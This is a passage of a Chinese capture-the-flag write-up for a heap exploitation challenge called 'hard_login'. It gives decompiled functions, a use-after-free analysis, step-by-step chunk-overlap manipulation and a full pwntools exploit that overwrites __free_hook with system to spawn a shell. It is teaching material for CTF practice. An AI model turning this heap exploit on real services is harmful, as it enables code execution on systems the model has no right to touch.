id);</span><br><span class="line">    *(_BYTE *)(v2 + <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;chunk + <span class="number">2</span> * id), <span class="number">0xF</span>uLL)) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your code:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%hu"</span>, v5);</span><br><span class="line">    *(_WORD *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) + <span class="number">0x10</span>LL) = *(_WORD *)v5;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, v5);</span><br><span class="line">    v3 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * id);</span><br><span class="line">    *(_BYTE *)(v3 + <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) + <span class="number">0x18</span>LL), <span class="number">7u</span>LL) + <span class="number">0x18</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your info:"</span>);</span><br><span class="line">    v4 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * id);</span><br><span class="line">    *(_BYTE *)(v4 + <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) + <span class="number">0x20</span>LL), <span class="built_in">size</span> - <span class="number">1</span>) + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.显示info内容功能（show_info）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall show_info@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp-1Ch] [rbp-1Ch]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your ID:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;v3, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v2) + <span class="number">24L</span>L), (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Password error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your info:"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v2) + <span class="number">0x20</span>LL));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.修改密码（find_password）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">find_password</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v2[<span class="number">7</span>]; <span class="comment">// [rsp-27h] [rbp-27h]</span></span><br><span class="line">  _BYTE v3[<span class="number">6</span>]; <span class="comment">// [rsp-26h] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp-24h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your ID:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your code:"</span>, &amp;v4);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%hu"</span>, v3);</span><br><span class="line">  <span class="keyword">if</span> ( *(_WORD *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v4) + <span class="number">16L</span>L) != *(_WORD *)v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Code error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, v3);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v4) + <span class="number">24L</span>L));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to change?(Y/N)"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">" %c"</span>, v2);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2[<span class="number">0</span>] != <span class="string">'Y'</span> &amp;&amp; v2[<span class="number">0</span>] != <span class="string">'y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2[<span class="number">0</span>] != <span class="string">'N'</span> &amp;&amp; v2[<span class="number">0</span>] != <span class="string">'n'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(v2[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"What are you doing?"</span>, v2);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your new password:"</span>, v2);</span><br><span class="line">    v0 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * v4);</span><br><span class="line">    *(_BYTE *)(v0 + <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v4) + <span class="number">24L</span>L), <span class="number">7u</span>LL) + <span class="number">24</span>) = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.释放堆块（delete）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall <span class="keyword">delete</span>@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp-1Ch] [rbp-1Ch]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your ID:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">10</span> || !chunk_state_check[<span class="number">4</span> * v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;v3, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v2) + <span class="number">24L</span>L), (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Password error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Done!"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;chunk + <span class="number">2</span> * v2));</span><br><span class="line">  chunk_state_check[<span class="number">4</span> * v2] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h2><p>在释放堆块（<code>free</code>）时，题目有个<code>if ( v2 &lt; 0 || v2 &gt; 10 || !chunk_state_check[4 * v2] )</code>来限制操作的chunk只能是未释放的。但是<code>find_password</code>和<code>show_info</code>并没有限制。同时，由于free功能里，清除的<code>chunk_state_check[4 * v2] = 0;</code>被不是存储的chunk指针而是chunk的大小。因此造成了UAF利用。</p><p>于是，我们可以利用申请两个unsorted bin chunk 释放让其合并，再制造错位放第二个chunk的残留指针刚好可以修改password同时，info泄露出libc_addr.同时，利用残留指针修改unsorted bin chunk 大小，制造出chunk重叠，从而修改free chunk fd从而修改free_hook为<code>system</code>地址。</p><h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>1.申请chunk，制造出uaf。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(129,&#39;lex&#39;,800,&#39;1&#39;*6,&#39;y&#39;*128)#0</span><br><span class="line">add(129,&#39;lex&#39;,800,&#39;1&#39;*6,&#39;y&#39;*128)#1</span><br><span class="line">add(0x400,&#39;lexs&#39;,800,&#39;1&#39;*6,&#39;x&#39;*(0x400-1))#2</span><br><span class="line">add(0x400,&#39;&#39;,0,&#39;1&#39;*6,&#39;x&#39;*0x1)#3</span><br><span class="line">add(0x88,&#39;&#39;,800,&#39;1&#39;*6, &#39;x&#39;*(0x88-1-7)+p64(0x410+0xb0)[:-1])#4</span><br><span class="line">add(129,&#39;&#39;,800,&#39;1&#39;*6, p64( 0x4f0) + p64(0xb0))#5</span><br><span class="line">add(129,&#39;&#39;,800,&#39;1&#39;*6, p64( 0x4f0) + p64(0xb0))#6</span><br><span class="line">free(0,&#39;1&#39;*6)</span><br><span class="line">free(1,&#39;1&#39;*6)</span><br><span class="line"></span><br><span class="line">free(2,&#39;1&#39;*6)</span><br><span class="line">free(3,&#39;1&#39;*6)</span><br><span class="line">add(0x420,&#39;&#39;,800,&#39;1&#39;*6,&#39;x&#39;*(0x400-1))#new_chunk_0</span><br></pre></td></tr></table></figure><p>2.通过chunk_4的残留指针 ,修改0x420 chunk的密码。再通过show功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(3,0,&#39;x&#39;*6)</span><br><span class="line">p.recv()</span><br><span class="line">show(3,&#39;x&#39;*6)</span><br></pre></td></tr></table></figure><p>3.利用第一步就布局的chunk_5和chunk_6,来制造重叠。 </p><p><img src="image-20221002105017934.png" alt="image-20221002105017934"></p><p>通过chunk_4的残留指针，修改new_chunk_0大小0x411为0x4f1.从而为一个0xb0合并成一个unsorted bin chunk。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(3,0,p64( 0x411+0xb0+0x30)[:-1])</span><br></pre></td></tr></table></figure><p><img src="image-20221002104358061.png" alt="image-20221002104358061"></p><p><img src="image-20221002104652016.png" alt="image-20221002104652016"></p><p>4.然后释放unsorted chunk，而释放被包含的0xb0 chunk从而制造出堆重叠。修改0xb0 chunk的fd为<code>__free_hook</code>,修改<code>__free_hook</code>的值的<code>system</code>.从而get shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(4,&#39;1&#39;*6)</span><br><span class="line"></span><br><span class="line">add(0x4c0-0x20,&#39;&#39;,0,&#39;1&#39;*6,&#39;y&#39;*0x3e0+p64(0)+p64(0xb0)+p64(x.dump(&#39;__free_hook&#39;))+p64(0))#3</span><br><span class="line">add(0x88,&#39;&#39;,800,&#39;1&#39;*6, &#39;x&#39;*(0x8))#4</span><br><span class="line">add(0x88,p64(x.dump(&#39;system&#39;)),800,&#39;1&#39;*6,p64(0)*3)#4</span><br><span class="line">add(0x98,&#39;&#x2F;bin&#x2F;sh\x00&#39;,800,&#39;1&#39;*6, &#39;x&#39;*(0x8))#4</span><br><span class="line">free(4,&#39;1&#39;*6)</span><br></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/15 11:25:12</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hard_login'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,code,password,info)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   print(<span class="string">'id:'</span>+p.recvline())</span><br><span class="line">   p.recvuntil(<span class="string">'Info size:'</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line">   p.sendline(name)</span><br><span class="line">   p.recvuntil(<span class="string">'Your code:'</span>)</span><br><span class="line">   p.sendline(str(code))</span><br><span class="line">   p.recvuntil(<span class="string">'Your password:'</span>)</span><br><span class="line">   p.sendline(str(password))</span><br><span class="line">   p.recvuntil(<span class="string">'Your info:'</span>)  </span><br><span class="line">   p.sendline(str(info))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id,password)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   p.sendline(str(id))</span><br><span class="line">   p.recvuntil(<span class="string">'Your password:'</span>)</span><br><span class="line">   p.sendline(password)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,code,pw)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   p.sendline(str(id))</span><br><span class="line">   p.recvuntil(<span class="string">'Your code:'</span>)</span><br><span class="line">   p.sendline(str(code))</span><br><span class="line">   print(p.recv())</span><br><span class="line">   p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your new password:'</span>)</span><br><span class="line">   p.sendline(pw)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(id,password)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'4'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   p.sendline(str(id))</span><br><span class="line">   p.recvuntil(<span class="string">'Your password:'</span>)</span><br><span class="line">   p.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">129</span>,<span class="string">'lex'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'y'</span>*<span class="number">128</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">129</span>,<span class="string">'lex'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'y'</span>*<span class="number">128</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'lexs'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'x'</span>*(<span class="number">0x400</span><span class="number">-1</span>))<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">''</span>,<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'x'</span>*<span class="number">0x1</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, <span class="string">'x'</span>*(<span class="number">0x88</span><span class="number">-1</span><span class="number">-7</span>)+p64(<span class="number">0x410</span>+<span class="number">0xb0</span>)[:<span class="number">-1</span>])<span class="comment">#4</span></span><br><span class="line">add(<span class="number">129</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, p64( <span class="number">0x4f0</span>) + p64(<span class="number">0xb0</span>))<span class="comment">#5</span></span><br><span class="line">add(<span class="number">129</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, p64( <span class="number">0x4f0</span>) + p64(<span class="number">0xb0</span>))<span class="comment">#6</span></span><br><span class="line">free(<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'x'</span>*(<span class="number">0x400</span><span class="number">-1</span>))</span><br><span class="line"><span class="comment">#add(0x200,'lexs','1'*7,'','x'*(0x200-1))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,<span class="string">'x'</span>*<span class="number">6</span>)</span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">3</span>,<span class="string">'x'</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your info:'</span>)</span><br><span class="line">addr= u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'base_addr:'</span>+hex(addr))</span><br><span class="line">main_arena_addr=addr<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arena_addr:'</span>+hex(main_arena_addr))</span><br><span class="line">__malloc_hook_addr=main_arena_addr<span class="number">-0x10</span></span><br><span class="line">log.info(<span class="string">'__malloc_hook_addr:'</span>+hex(__malloc_hook_addr))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,p64( <span class="number">0x411</span>+<span class="number">0xb0</span>+<span class="number">0x30</span>)[:<span class="number">-1</span>])</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,__malloc_hook_addr,num=<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4c0</span><span class="number">-0x20</span>,<span class="string">''</span>,<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'y'</span>*<span class="number">0x3e0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb0</span>)+p64(x.dump(<span class="string">'__free_hook'</span>))+p64(<span class="number">0</span>))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, <span class="string">'x'</span>*(<span class="number">0x8</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x88</span>,p64(x.dump(<span class="string">'system'</span>)),<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'/bin/sh\x00'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, <span class="string">'x'</span>*(<span class="number">0x8</span>))<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>,<span class="string">'1'</span>*<span class="number">6</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;太久没有做堆题了，突然做一道感觉还挺有意思的(主要全都忘完了/(ㄒoㄒ)/~~)</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2022川渝个人赛-wp</title>
    <link href="lexsd6.github.io/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/"/>
    <id>lexsd6.github.io/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/</id>
